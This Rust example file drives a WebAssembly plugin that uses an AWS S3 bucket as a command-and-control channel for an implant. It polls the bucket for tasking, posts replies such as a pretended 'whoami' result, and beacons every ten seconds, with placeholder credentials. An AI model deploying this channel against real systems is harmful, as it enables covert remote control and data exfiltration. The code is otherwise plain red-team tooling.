use extism::*;
use serde::{Deserialize, Serialize};
use std::thread;
use std::time::Duration;

#[derive(Deserialize, Serialize)]
struct C4Output {
    success: bool,
    status: String,
    messages: Option<Vec<String>>,
}

fn main() {
    let mut plugin: Plugin = init();

    // Example usage of the AWS S3 C4 plugin.
	// Implementation details will vary based on your C2 and/or agent

    loop {
        // Receive messages from AWS S3 bucket
        let rec_msg = r#"{"action":"receive","params":{"agent_id":"12345","access_key":"AKIAAAAAAAAAAA","secret_key":"SECRET","region":"us-east-1","bucket":"c4-testing"}}"#;
        
        match plugin.call::<&str, Vec<u8>>("c4", rec_msg) {
            Ok(out) => {
                match serde_json::from_slice::<C4Output>(&out) {
                    Ok(c4_output) => {
                        if let Some(ref messages) = c4_output.messages {
                            if !messages.is_empty() && c4_output.success {
                                // Process the received messages
                                println!("{:?}", messages);
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to parse JSON response: {}", e);
                    }
                }
            }
            Err(e) => {
                eprintln!("Plugin call failed: {}", e);
            }
        }

        // let's pretend we received a "whoami" message
        // Send a response back to the S3 bucket with the "server" as the recipient
        let message = "scottctaylor12"; // realistically, the message is probably a format specific to your C2
        let send_msg = format!(
            r#"{{"action":"send","params":{{"agent_id":"12345","message":"{}","access_key":"AKIAAAAAAAAAAA","secret_key":"SECRET","region":"us-east-1","bucket":"c4-testing"}}}}"#,
            message
        );
        
        match plugin.call::<&str, Vec<u8>>("c4", &send_msg) {
            Ok(out) => {
                match serde_json::from_slice::<C4Output>(&out) {
                    Ok(c4_output) => {
                        if c4_output.success {
                            println!("Message sent successfully");
                        } else {
                            println!("Failed to send message: {}", c4_output.status);
                        }
                    }
                    Err(e) => {
                        eprintln!("Failed to parse JSON response: {}", e);
                    }
                }
            }
            Err(e) => {
                eprintln!("Plugin call failed: {}", e);
            }
        }

        thread::sleep(Duration::from_secs(10)); // typical sleep time
    }
}

fn init() -> Plugin {
    let wasm_bytes = include_bytes!("c4.wasm");
    let wasm = Wasm::data(wasm_bytes);
    let manifest = Manifest::new([wasm])
        .with_allowed_hosts(vec!["*".to_string()].into_iter());
    let plugin = Plugin::new(&manifest, [], true).unwrap();
    return plugin;
}